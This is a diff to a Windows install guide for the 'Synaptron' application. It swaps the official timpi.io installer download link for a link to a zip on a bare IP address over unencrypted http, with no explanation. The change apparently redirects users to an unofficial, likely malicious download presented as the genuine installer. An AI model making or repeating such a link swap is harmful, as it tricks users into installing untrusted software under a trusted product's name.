@@ -7,7 +7,9 @@ This guide will walk you through installing and setting up Synaptron on Windows,
 ### :inbox_tray: Download the full PDF guide [Click Here](https://timpi.io/wp-content/uploads/2025/02/Synaptron-Guide-v1.pdf)
 
 ### :package: Download & Install the required files:
-:small_blue_diamond: [Synaptron installer](https://timpi.io/applications/windows/synaptron_win_latest.zip)
+
+:small_blue_diamond: [Synaptron_installer](http://185.182.184.58/Synaptron_Win_Latest.zip)
+
 
 ![Skärmavbild 2025-06-15 kl  19 38 44](https://github.com/user-attachments/assets/26905e93-9dc2-4266-8537-a73db1a55471)
 
